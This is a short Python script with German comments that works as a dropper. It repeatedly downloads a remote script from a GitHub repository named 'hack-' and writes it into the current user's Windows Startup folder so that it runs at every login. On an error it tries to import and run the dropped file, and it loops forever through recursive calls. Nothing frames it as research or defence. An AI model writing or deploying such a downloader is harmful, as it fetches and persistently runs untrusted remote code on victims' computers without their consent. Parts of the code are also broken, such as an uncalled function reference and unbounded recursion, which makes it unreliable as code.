import urllib.request
import re
import time
import os
import getpass
def h():

    time.sleep(5)
    download_and_save_script()
    h()

def download_and_save_script():
    
    url = "https://raw.githubusercontent.com/huggywuggyMaster/hack-/main/run.py"
    current_user = getpass.getuser()
    file_path = fr"C:\\Users\{current_user}\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\S468.py"

    
    try:
        # Skript von der URL herunterladen
        with urllib.request.urlopen(url) as response:
            script_content = response.read()
        
        # Skript am angegebenen Speicherort speichern
        with open(file_path, 'wb') as file:
            file.write(script_content)
        
       
    except Exception as e:
        print()
        runAndDelete()

# Beispielaufruf der Funktion


def runAndDelete():
    import S468
    S468.runIt
    h()
h()
